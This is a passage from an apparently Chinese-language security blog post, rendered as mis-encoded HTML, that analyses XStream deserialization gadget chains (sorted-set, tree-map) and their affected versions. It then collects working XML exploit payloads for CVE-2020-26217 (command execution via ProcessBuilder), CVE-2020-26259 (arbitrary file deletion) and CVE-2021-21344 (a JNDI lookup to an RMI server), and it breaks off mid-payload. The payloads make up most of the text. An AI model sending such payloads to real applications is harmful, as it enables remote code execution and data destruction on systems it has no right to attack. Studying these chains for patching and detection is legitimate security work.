alt="image-20241106115157218"></p><p>è¿™é‡Œçš„resultå°±æ˜¯TreeMapï¼Œç„¶åé‡Œé¢å°±ä¼šè§¦å‘æˆ‘ä»¬çš„åŠ¨æ€ä»£ç†æ–¹æ³•äº†</p><p>å› ä¸ºæˆ‘ä»¬çš„xmlé…ç½®ä»£ç†çš„æ¥å£æ˜¯Comparableï¼Œç„¶åTreeMapåœ¨è°ƒç”¨putAllæ–¹æ³•çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°putæ–¹æ³•ï¼Œè€Œé‡Œé¢è°ƒç”¨äº†compareæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241106121046532.png" alt="image-20241106121046532"></p><p>æœ€ç»ˆå°±ä¼šèµ°åˆ°EventHandler#invokeInternalæ–¹æ³•é‡Œé¢ï¼Œç„¶ååå°„è°ƒç”¨ProcessBuilderçš„startæ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241106121145638.png" alt="image-20241106121145638"></p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p>åœ¨å°äºç­‰äº1.3.1ç‰ˆæœ¬ï¼Œè¿è¡ŒæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨</p><p><strong>1.4.1-1.4.4æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>åœ¨TreeSetConverter.unmarshal()ä¸­ï¼Œåªæœ‰å½“sortedMapFieldå’ŒtreeMapä¸ä¸ºnullæ—¶ï¼Œæ‰èƒ½è¿›å…¥populateTreeMap()</p><p><img src="https://cdn.clown2024.cn/image-20241106122009384.png" alt="image-20241106122009384"></p><p>è€Œ1.4.1-1.4.4ç‰ˆæœ¬ä¸­ï¼ŒsortedMapFieldé»˜è®¤ä¸ºnull</p><p><img src="https://cdn.clown2024.cn/image-20241106122129571.png" alt="image-20241106122129571"></p><p><strong>1.4.7-1.4.9æ— æ³•è§¦å‘çš„åŸå› </strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h2 id="tree-map"><a href="#tree-map" class="headerlink" title="tree-map"></a>tree-map</h2><h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><p>ç‰ˆæœ¬&lt;&#x3D;1.4.6æˆ–&#x3D;1.4.10</p><p>payload</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">tree-map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.EventHandler&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>good<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tree-map</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="æµç¨‹è¯´æ˜"><a href="#æµç¨‹è¯´æ˜" class="headerlink" title="æµç¨‹è¯´æ˜"></a>æµç¨‹è¯´æ˜</h3><p>è¿™é‡Œå…¶å®å°±å’Œsortedçš„è¿‡ç¨‹æ˜¯å·®ä¸å¤šçš„ï¼Œå°±ä¸åšè¿‡å¤šçš„åˆ†æäº†</p><p>ä»–å’Œsorted-setçš„åŒºåˆ«å°±æ˜¯åœ¨TreeMapConverter#unmarshalçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/image-20241106141841502.png" alt="image-20241106141841502"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰TreeSetConverteré‚£ä¹ˆå¤šçš„é™åˆ¶</p><p>ä¸»è¦è¿˜æ˜¯è®°ä¸€ä¸‹payloadä»¥åŠä½¿ç”¨ç‰ˆæœ¬ï¼Œä»¥åŠåé¢ä¹Ÿæ˜¯åªæ”¶é›†ä¸€äº›CVEçš„payload</p><h3 id="å…¶ä»–è¯´æ˜"><a href="#å…¶ä»–è¯´æ˜-1" class="headerlink" title="å…¶ä»–è¯´æ˜"></a>å…¶ä»–è¯´æ˜</h3><p><strong>åœ¨&lt;&#x3D;1.3.1ç‰ˆæœ¬</strong></p><p>ä¼šæŠ¥é”™æ˜¾ç¤ºTreeMapæ²¡æœ‰åŒ…å«comparatorå…ƒç´ ï¼Œå³ä¸æ”¯æŒPoCä¸­ä¸¤ä¸ªå­æ ‡ç­¾å…ƒç´ è°ƒç”¨compareTo()è¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤æ— æ³•åˆ©ç”¨ï¼Œä¸sorted-setåŸå› ä¸€æ ·</p><p><strong>1.4.7-1.4.9ç‰ˆæœ¬</strong></p><p>ReflectionConverter.canConvert()å‡½æ•°ä¸­æ·»åŠ äº†å¯¹EventHandlerç±»çš„è¿‡æ»¤</p><h1 id="payloadæ”¶é›†"><a href="#payloadæ”¶é›†" class="headerlink" title="payloadæ”¶é›†"></a>payloadæ”¶é›†</h1><h2 id="cve-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2020-26217è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.13</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">e</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">iterator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">iter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">cursor</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">cursor</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">lastRet</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">lastRet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">expectedModCount</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">expectedModCount</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">java.lang.ProcessBuilder</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">outer-class</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">iter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">method</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">method</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">next</span>/&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">iterator</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>KEYS<span class="hljs-tag">&lt;/<span class="hljs-name">type</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">e</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">in</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">buf</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">buf</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">pos</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">pos</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">mark</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">mark</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">in</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">consumed</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">consumed</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106145534172.png" alt="image-20241106145534172"></p><h2 id="cve-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>CVE-2020-26259ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;1.4.14</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">flags</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">flags</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataHandler</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">contentType</span>&gt;</span>text/plain<span class="hljs-tag">&lt;/<span class="hljs-name">contentType</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">is</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.util.ReadAllStream$FileStream&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">tempFile</span>&gt;</span>test.txt<span class="hljs-tag">&lt;/<span class="hljs-name">tempFile</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">is</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">transferFlavors</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">dataHandler</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">dataLen</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">dataLen</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªtxtåœ¨é¡¹ç›®æ ¹ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241106145406896.png" alt="image-20241106145406896"></p><p>ç„¶åæˆåŠŸåˆ é™¤</p><h2 id="cve-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21344è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>getDatabaseMetaData<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                                                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">concurrency</span>&gt;</span>1008<span class="hljs-tag">&lt;/<span class="hljs-name">concurrency</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">escapeProcessing</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">escapeProcessing</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchDir</span>&gt;</span>1000<span class="hljs-tag">&lt;/<span class="hljs-name">fetchDir</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">fetchSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">fetchSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">isolation</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">isolation</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxFieldSize</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxFieldSize</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">maxRows</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">maxRows</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">queryTimeout</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">queryTimeout</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">readOnly</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">readOnly</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">rowSetType</span>&gt;</span>1004<span class="hljs-tag">&lt;/<span class="hljs-name">rowSetType</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">showDeleted</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">showDeleted</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/exp<span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">params</span>/&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">javax.sql.rowset.BaseRowSet</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">iMatchColumns</span>&gt;</span><br>                                            <span class="hljs-tag">&lt;<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>                                                <span class="hljs-tag">&lt;<span 